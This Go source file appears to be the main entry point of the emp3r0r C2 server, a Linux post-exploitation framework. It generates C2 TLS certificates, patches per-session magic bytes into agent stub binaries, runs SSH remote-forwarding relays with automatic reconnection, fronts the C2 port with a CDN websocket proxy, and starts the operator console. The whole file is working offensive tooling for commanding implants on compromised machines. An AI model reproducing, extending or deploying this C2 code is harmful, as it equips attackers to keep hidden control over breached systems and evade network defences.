//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/cc"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

var Logger = logging.NewLogger(2)

func readJSONConfig(filename string) (err error) {
	// read JSON
	jsonData, err := os.ReadFile(filename)
	if err != nil {
		return
	}

	return emp3r0r_def.ReadJSONConfig(jsonData, cc.RuntimeConfig)
}

// re-generate a random magic string for this CC session
func init_magic_agent_one_time_bytes() {
	default_magic_str := emp3r0r_def.OneTimeMagicBytes
	emp3r0r_def.OneTimeMagicBytes = util.RandBytes(len(default_magic_str))

	// update binaries
	files, err := os.ReadDir(cc.EmpWorkSpace)
	if err != nil {
		Logger.Fatal("init_magic_str: %v", err)
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		if strings.HasPrefix(f.Name(), "stub-") {
			err = util.ReplaceBytesInFile(fmt.Sprintf("%s/%s", cc.EmpWorkSpace, f.Name()),
				default_magic_str, emp3r0r_def.OneTimeMagicBytes)
			if err != nil {
				Logger.Error("init_magic_str %v", err)
			}
		}
	}
}

func main() {
	// set up dirs and default varaibles
	// including config file location
	err := cc.InitC2()
	if err != nil {
		log.Fatalf("C2 directory setup: %v", err)
	}

	// set up logger
	Logger = logging.NewLogger(2)

	// command line arguments
	cdnproxy := flag.String("cdn2proxy", "", "Start cdn2proxy server on this port")
	config := flag.String("config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
	names := flag.String("gencert", "", "Generate C2 server cert with these host names")
	apiserver := flag.Bool("api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
	ssh_relay_port := flag.String("relay_server", "", "Act as SSH remote forwarding relay on this port")
	connect_relay_addr := flag.String("connect_relay", "", "Connect to SSH remote forwarding relay (host:port)")
	relayed_port := flag.Int("relayed_port", 0, "Relayed port, use with -connect_relay")
	debug := flag.Bool("debug", false, "Do not kill tmux session when crashing, so you can see the crash log")
	flag.Parse()

	// do not kill tmux session when crashing
	if *debug {
		cc.TmuxPersistence = true
	}

	// generate C2 TLS cert for given host names
	if *names != "" {
		hosts := strings.Fields(*names)
		certErr := cc.GenC2Certs(hosts)
		if certErr != nil {
			Logger.Fatal("GenC2Certs: %v", certErr)
		}
		certErr = cc.InitConfigFile(hosts[0])
		if certErr != nil {
			Logger.Fatal("Init %s: %v", cc.EmpConfigFile, certErr)
		}
		os.Exit(0)
	}

	// read config file
	err = readJSONConfig(*config)
	if err != nil {
		Logger.Fatal("Failed to read config from '%s': %v", *config, err)
	}

	// set up magic string
	init_magic_agent_one_time_bytes()

	// abort if CC is already running
	if cc.IsCCRunning() {
		Logger.Fatal("CC is already running")
	}

	// run as relay client, connect to relay server via SSH
	if *connect_relay_addr != "" {
		if *relayed_port == 0 {
			Logger.Fatal("Please specify -relayed_port")
		}
		ssh_password := new(string)
		fmt.Printf("Enter SSH password: ")
		fmt.Scanln(ssh_password)
		go func(ssh_password string) {
			defer Logger.Error("session unexpectedly exited, please restart emp3r0r")
			SSHConnections := make(map[string]context.CancelFunc, 10)
			pubkey, sshKeyErr := tun.SSHPublicKey(cc.RuntimeConfig.SSHHostKey)
			if sshKeyErr != nil {
				Logger.Fatal("Parsing SSHPublicKey: %v", sshKeyErr)
			}
		ssh_connect:
			ctx, cancel := context.WithCancel(context.Background())
			sshKeyErr = tun.SSHRemoteFwdClient(*connect_relay_addr,
				ssh_password,
				pubkey, // enable host key verification
				*relayed_port,
				&SSHConnections, ctx, cancel)
			if sshKeyErr == nil {
				sshKeyErr = fmt.Errorf("session unexpectedly exited")
				Logger.Warning("SSHRemoteFwdClient: %v, retrying", sshKeyErr)
			}
			for ctx.Err() == nil {
				util.TakeABlink()
			}
			goto ssh_connect
		}(*ssh_password)
	}

	// start cdn2proxy server
	if *cdnproxy != "" {
		go func() {
			logFile, openErr := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0o600)
			if openErr != nil {
				Logger.Fatal("OpenFile: %v", openErr)
			}
			openErr = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+cc.RuntimeConfig.CCPort, "ws", logFile)
			if openErr != nil {
				Logger.Fatal("CDN StartServer: %v", openErr)
			}
		}()
	}

	// use emp3r0r in terminal or from other frontend
	if *apiserver {
		// TODO: implement API main
		Logger.Fatal("API server is not implemented yet")
	}

	// run as relay server
	// no need to start CC services
	if *ssh_relay_port != "" {
		ssh_password := util.RandMD5String()
		log.Printf("SSH password is %s. Copy ~/.emp3r0r to client host, "+
			"then run `emp3r0r -connect_relay relay_ip:%s -relayed_port %s` "+
			"(C2 port, or Shadowsocks port %s if you are using it)",
			strconv.Quote(ssh_password), *ssh_relay_port, cc.RuntimeConfig.CCPort, cc.RuntimeConfig.ShadowsocksLocalSocksPort)
		err = tun.SSHRemoteFwdServer(*ssh_relay_port,
			ssh_password,
			cc.RuntimeConfig.SSHHostKey)
		if err != nil {
			log.Fatalf("SSHRemoteFwdServer: %v", err)
		}
	} else {
		// run CLI
		cc.CliMain()
	}
}
